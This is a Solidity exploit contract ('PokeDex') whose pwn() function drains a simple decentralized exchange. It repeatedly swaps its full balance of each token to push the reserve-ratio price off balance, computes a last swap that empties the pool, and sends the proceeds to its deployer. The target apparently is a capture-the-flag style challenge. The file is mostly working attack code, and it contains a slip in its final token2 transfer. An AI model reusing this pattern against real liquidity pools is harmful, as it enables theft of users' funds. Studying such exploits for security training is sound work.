// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "hardhat/console.sol";

//send 10 Token X to Dex from EoA
//sell balance of Token Y
//sell balance of Token X
//sell balance of Token Y
//repeat until either Dex Balance of X is 0 or Dex Balance of Y is 0

interface Dex {
    function swap(address from, address to, uint amount) external;
    function getSwapPrice(address from, address to, uint amount) external view returns(uint);
    function approve(address spender, uint amount) external;
    function balanceOf(address token, address account) external view returns (uint);
    function token1() external view returns(address);
    function token2() external view returns(address);
}



contract PokeDex {
    Dex target;
    address targetAddress;
    IERC20 token1;
    IERC20 token2;
    address token1Address;
    address token2Address;
    address home;
    constructor(address _target) {
        home = msg.sender;
        target = Dex(_target);
        targetAddress = _target; //duplicity; address property not available on interfaces :(
        token1 = IERC20(target.token1());
        token2 = IERC20(target.token2());
        token1Address = target.token1();
        token2Address = target.token2();
    }


    
    function pwn() public {
        token1.transferFrom(msg.sender, address(this), token1.balanceOf(msg.sender));
        token2.transferFrom(msg.sender, address(this), token2.balanceOf(msg.sender));
        target.approve(targetAddress, type(uint256).max);
        token1.transfer(targetAddress, token1.balanceOf(address(this))); //this creates an imbalance in the pool because price is just reservesIn/reservesOut in this DEX

        console.log("start balances of this contract");
        console.logUint(token1.balanceOf(address(this)));
        console.logUint(token2.balanceOf(address(this)));

        bool goFlag = true;
        while (goFlag == true) {
            //if we have token1, sell it; if we have token2, then sell that instead.
            if (token1.balanceOf(address(this)) > 0) {
                try target.swap(token1Address, token2Address, token1.balanceOf(address(this)))
                {
                    continue;
                } catch  {
                    goFlag = false;
                }
            }
            if (token2.balanceOf(address(this)) > 0) {
                try target.swap(token2Address, token1Address, token2.balanceOf(address(this)))
                {
                    continue;
                } catch  {
                    goFlag = false;
                }
            }
            if (goFlag == false) {
                //@dev - algebra for amountOut
                //amountOut = amountIn * reservesOut / reservesIn
                //amountOut * reservesIn / reservesOut = amountIn
                uint x = token2.balanceOf(targetAddress) * token1.balanceOf(targetAddress) / token2.balanceOf(targetAddress);
                target.swap(token1Address, token2Address, x);
            }

        console.log("Updated victim lp balances After Swap");
        console.logUint(token1.balanceOf(targetAddress));
        console.logUint(token2.balanceOf(targetAddress));
        }

        console.log("end balances of this contract");
        console.logUint(token1.balanceOf(address(this)));
        console.logUint(token2.balanceOf(address(this)));

        token1.transfer(home, token1.balanceOf(address(this)));
        token2.transfer(home, token1.balanceOf(address(this)));
    }

}

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the value of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the value of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves a `value` amount of tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 value) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets a `value` amount of tokens as the allowance of `spender` over the
     * caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 value) external returns (bool);

    /**
     * @dev Moves a `value` amount of tokens from `from` to `to` using the
     * allowance mechanism. `value` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}
